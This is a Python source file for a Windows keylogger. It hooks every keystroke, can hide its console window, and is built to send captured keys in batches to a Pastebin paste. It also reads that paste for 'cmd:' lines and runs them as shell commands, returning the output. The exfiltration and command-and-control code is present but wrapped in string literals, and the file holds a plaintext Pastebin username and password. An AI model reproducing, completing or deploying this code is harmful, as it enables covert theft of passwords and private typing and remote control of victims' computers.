import pyHook, pythoncom,os,win32api,win32console, win32gui, mechanize, thread, subprocess
DEBUG = True


global message
message = ''

if not DEBUG:
        win = win32console.GetConsoleWindow() 
        win32gui.ShowWindow(win,0) # Hide the command window


def OnKeyboardEvent(event): # Keyboard Hooks
    global message
    print(event)
    if (event.Ascii) == 8: # Backspace
        data = '<-'
    elif (event.Ascii) == 13: # Enter (not numpad)
        data = 'Enter'
    elif (event.Ascii) == 0: # Shift key
        data = '*'
    else:
        data =str(chr(event.Ascii)) # Convert keyboard code to ascii
    if data == '<-':
        try:
            message= message[:-1] # Delete a character if not the first character
        except:
            message=message+data # If it is the first character in the set of 30 then still keep track of it
    if len( message)%30 == 0:
        thread.start_new_thread(post_keys,(message,)) # Start thread for posting 30 keys 
        message = ''
        
        
    return True
    
def command(text): # RCE anyone?
    '''
    After finding a command in the pastebin in the form "cmd:[command] [args]:" this will parse it out and execute
    '''
    split = text.split('cmd:')[1].strip() # Split on cmd: and remove spaces
    split=split.split(':')[0]
    if ' ' in split:
                cmd = split[:split.index(' ')].strip() # First thing after cmd: should be the command followed by a space, this retreives the command
                args = split[split.index(' '):].strip() # everything after [command] until the next : should be arguments
    else:
                cmd = split
                args = ''
    post_message = subprocess.Popen([cmd, args], stdout=subprocess.PIPE).communicate()[0] # Executes the command and retreives the output

    
    try: # in case we don't have internet access
        '''
        browser = mechanize.Browser()
        browser.set_handle_robots(False)
        cookies = mechanize.CookieJar()

        browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US)     AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]
        browser.open("http://pastebin.com/login")
        browser.select_form(nr=2)

        browser.form['user_name'] = 'wolfpack270' # uhhhhhhh.........plaintext username/password anyone?
        browser.form['user_password'] = 'werewolf657'
        response = browser.submit()
        
        browser.open('http://pastebin.com/edit/jRjUdt2D')
        browser.select_form(nr=2)
        text = browser.form['paste_code']


        
        post_message = text+post_message # Set the post_message to what was already in the form + the output of the command
        browser.form['paste_code'] = post_message 
        browser.submit()
        browser.close() # what happens if I close before the rest of the script is done....'''
        print(post_message)
    
    except:
            global message
            message = post_message+message    

    
def post_keys(post_message):
    '''
    Takes any given message and attempts to post it to pastebin. Also looks for RCE calls
    '''

    try: # In case we don't have internet access
        '''
        browser = mechanize.Browser()
        browser.set_handle_robots(False)
        cookies = mechanize.CookieJar()

        browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US)     AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]
        browser.open("http://pastebin.com/login")
        browser.select_form(nr=2)

        browser.form['user_name'] = 'wolfpack270'
        browser.form['user_password'] = 'werewolf657'
        response = browser.submit()
        browser.open('http://pastebin.com/edit/jRjUdt2D')
        browser.select_form(nr=2)
        text = browser.form['paste_code']

        
        if ('cmd:' in text): # parse the already existing text looking for a command
            thread.start_new_thread(command,(text,)) # Not actually sure how mechanize handles a threaded situation but we thread in case we have a long running command
            text=text.replace('cmd:','') # remove the cmd: so we don't execute repeatedly

            
        post_message = text+post_message
        browser.form['paste_code'] = post_message
        browser.submit()
        browser.close() # what happens if I close before the thread is done???
                '''
        print(post_message)
        

    except:
            global message
            message = post_message+message

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()



